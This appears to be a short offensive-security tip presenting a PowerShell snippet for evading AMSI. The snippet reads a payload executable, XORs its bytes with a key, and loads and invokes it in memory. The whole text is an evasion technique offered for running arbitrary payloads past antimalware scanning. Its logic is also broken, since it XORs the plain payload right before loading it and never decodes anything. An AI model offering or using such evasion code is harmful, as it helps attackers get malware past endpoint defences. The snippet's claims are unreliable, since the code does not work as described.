XOR a byte array with a certain key to bypass AMSI
The key can be any arbitrary value, and the byte array can be the binary of the payload you want to execute. 

```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\payload.exe")
$key = 0xAA
for ($i = 0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = $bytes[$i] -bxor $key
}
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)
```
